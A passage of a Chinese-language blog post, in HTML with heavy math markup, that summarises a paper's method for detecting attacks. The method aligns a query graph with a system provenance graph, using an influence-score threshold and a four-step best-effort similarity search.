style="height:1.2959679999999998em;vertical-align:-0.4508599999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:-0.07153em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mord mathdefault mtight">h</span><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4508599999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>或者更大；另一方面，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mo stretchy="false">(</mo><msub><mi>G</mi><mi>q</mi></msub><mo>:</mo><mo>:</mo><msub><mi>G</mi><mi>p</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S(G_q::G_p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>表示influence score的平均值。因此，我们如下定义阈值<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="script">T</mi></mrow><annotation encoding="application/x-tex">\mathcal{T}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.25417em;">T</span></span></span></span></span>：</p><p><img src="https://img-blog.csdnimg.cn/20200325201742913.png#pic_center" alt="" /></p><p>如果<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mo stretchy="false">(</mo><msub><mi>G</mi><mi>q</mi></msub><mo>:</mo><mo>:</mo><msub><mi>G</mi><mi>p</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S(G_q::G_p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>超过阈值<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="script">T</mi></mrow><annotation encoding="application/x-tex">\mathcal{T}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.25417em;">T</span></span></span></span></span>，就会产生报警。</p><h2 id="52-best-effort-similarity-search"><a class="markdownIt-Anchor" href="#52-best-effort-similarity-search"></a> 5.2 Best-Effort Similarity Search</h2><p>在定义完alignment score之后，我们来描述如何搜索alignment使得alignment score最大化。</p><p>第一个面临的挑战的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>的规模会很大，因此，存储<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中每一对节点的influence score是不实际的，我们对图执行<strong>按需便利</strong>；此外，我们假设所有的分析是在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>固定快照上进行的，即从开始搜索到终止，其节点或边不会发生任何变化。</p><p>搜索算法包含以下四步，其中步骤2-4会重复执行，直到找到alignment score超过阈值时停止：</p><h3 id="step-1-找到所有候选alignment节点"><a class="markdownIt-Anchor" href="#step-1-找到所有候选alignment节点"></a> Step 1 找到所有候选Alignment节点</h3><p>在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中找到所有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>的候选节点，其依据是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中节点的name、type、annotations等。比如在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中出现的与<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>具有相似type（如process）和label（FireFox）的节点等；与<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中的正则表达式描述的节点相对应的节点；以及用户手动配置的alignment节点。</p><p>注意到在这一步我们没有关于路劲和flow的充分信息，而只是孤立的看待每个节点。在Fig.3中，候选节点alignments用相同的颜色来标识。</p><h3 id="step-2-选择种子节点"><a class="markdownIt-Anchor" href="#step-2-选择种子节点"></a> Step 2 选择种子节点</h3><p>为了找到足够好的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub><mo>:</mo><mo>:</mo><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_q::G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>alignment，我们需要通过在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中遍历，来探索上一步得到的候选节点之间的连接关系。</p><p>由于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>的规模问题，需要选择一个好的开始点进行遍历。我们观察到，恶意活动占据了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>的一小部分，而良性活动一般会重复多次。基于此，我们依据<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中每个节点在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中对应的候选alignmen的个数，对<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中的节点进行排序，然后优先选择具有最少alignment的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中的节点（最有可能是攻击行为）作为种子节点。</p><p>在Fig.3中，%browser%为种子节点</p><h3 id="step-3-扩大搜索范围"><a class="markdownIt-Anchor" href="#step-3-扩大搜索范围"></a> Step 3 扩大搜索范围</h3><p>从种子节点开始进行前向/反向分析，看看是否能到达Step1所找到的候选节点。为了高效地进行搜索，我们在搜索过程中，一旦种子节点到搜索到的当前节点之间的influence score为0时，就停止搜索。（文中有举例）</p><p>还有一个问题，即从种子节点开始前向/后向分析，可能会有一些节点遍历不到；因此我们对于遍历不到的节点，从未遍历到节点的相邻节点（以被遍历到）开始，进行重复的前向/后向分析。直到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中所有的节点的alignment都被覆盖。</p><h3 id="step-4-graph-alignment-selection"><a class="markdownIt-Anchor" href="#step-4-graph-alignment-selection"></a> Step 4 Graph Alignment Selection</h3><p>这一步骤用于生成最终的结果，或者开始另一轮Step 2的迭代。</p><p>可能的候选graph alignment数量可能会很大，如果<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中的每个节点<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>对应<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>n</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">n_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>个候选graph alignment，那么可能的总数为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mo>∏</mo><mi>i</mi></msub><msub><mi>n</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\prod_{i} n_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0497100000000001em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∏</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16195399999999993em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>个，在Fig.3的例子中，共有216（2x3x3x3x4）种可能。在这一步，我们根据等式2，寻找可以使得alignment score最大的graph alignment。</p><p>本文的方法是：从<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>种的种子节点开始，选择<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中使得alignment score最大的节点，并将其固定；然后继续固定与种子节点相连的其它节点的alignment。</p><ul><li><strong>Selection Function</strong></li></ul><p>该函数的作用是选择、固定node alignment；通过估计每个node alignment会对最终的alignment score产生多大的贡献，来选择产生最大贡献的节点。</p><p>对于一个给定的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中的aligned node <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" 